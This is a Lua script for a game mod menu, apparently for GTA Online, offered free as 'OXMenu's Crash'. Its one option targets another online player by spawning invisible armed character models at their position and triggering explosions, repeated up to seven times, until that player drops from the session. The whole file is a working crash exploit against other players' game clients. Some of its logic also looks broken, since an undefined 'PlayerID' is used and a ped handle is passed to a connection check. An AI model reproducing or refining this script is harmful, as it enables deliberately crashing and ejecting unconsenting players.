Archer_option = ui.add_player_submenu("OXMenu'Crash")

function notify(text)
    local str_text = tostring(text)
    system.notify("OXMenu'Crash.lua", str_text, 0, 255, 0, 255)
    system.log("OXMenu'Crash.lua is loading", str_text)
end

function player_exists(TargetPlayerPed)
    return NETWORK.NETWORK_IS_PLAYER_CONNECTED(TargetPlayerPed) == 1
end


notify("Inject OXMenu's Crash.lua successfully\nAuthor:MG742\nFree to use")
notify("This lua is not steady")
ui.add_click_option("OXMenu's Crash", Archer_option, function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local selfped = PLAYER.PLAYER_PED_ID()
        local PED1 = entities.create_ped(26,utils.joaat("cs_beverly"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
        system.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
        system.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

        system.yield(10000)
       
        entities.delete(PED1)

        notify("Crash step 1 finished")
        if player_exists(TargetPlayerPed) then
                notify("Failed to remove player, other models are in use")
                local PED2 = entities.create_ped(26,utils.joaat("cs_fabien"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED2)
                notify("Crash step 2 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("Step 2 failed to remove player, other models are in use")
                local PED3 = entities.create_ped(26,utils.joaat("cs_manuel"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED3)
                notify("Crash step 3 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("Step 3 failed to remove player, other models are in use")
                local PED4 = entities.create_ped(26,utils.joaat("cs_taostranslator"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED4)
                notify("Crash step 4 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("Step 4 failed to remove player, other models are in use")
                local PED5 = entities.create_ped(26,utils.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED5)
                notify("Crash step 5 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("Step 5 failed to remove player, other models are in use")
                local PED6 = entities.create_ped(26,utils.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED6)
                notify("Crash step 6 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("Step 6 failed to remove player, other models are in use")
                local PED7 = entities.create_ped(26,utils.joaat("cs_wade"),TargetPlayerPos, 0)
                ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
                system.yield(100)
                WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
                system.yield(1000)
                FIRE.ADD_OWNED_EXPLOSION(selfped, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
                system.yield(10000)
    
                entities.delete(PED7)
                notify("Crash step 7 finished")
        end
        if player_exists(TargetPlayerPed) then
                notify("All crash steps failed\nDo not try again,u should wait for 1 mins or more\nif u try again quickly, it wil crash ur self")
        end
end)

while true do
	system.yield(0)
end
